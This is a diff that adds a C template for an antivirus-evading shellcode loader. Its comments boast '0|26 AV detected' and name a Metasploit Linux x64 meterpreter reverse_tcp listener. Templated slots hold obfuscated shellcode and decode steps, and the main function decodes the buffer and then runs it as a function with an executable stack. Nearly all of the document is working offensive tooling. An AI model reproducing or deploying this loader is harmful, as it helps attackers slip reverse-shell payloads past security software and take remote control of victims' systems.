@@ -1,0 +1,20 @@
+// 0|26 AV detected
+//Listener Linux/x64/meterpreter/reverse_tcp
+//Compile w/ gcc -o run.elf run.c -z execstack
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+//encoder.c output
+{{{ShellCodeHeader}}}
+{{{ObfuscatedShellCode}}}
+
+int main(int argc, char **argv)
+{
+        int arraysize = (int) sizeof(buf);
+        for (int i=0; i<arraysize-1; i++)
+        {
+{{{DecodeInstructions}}}        }
+        int (*ret)() = (int(*)())buf;
+        ret();
+}
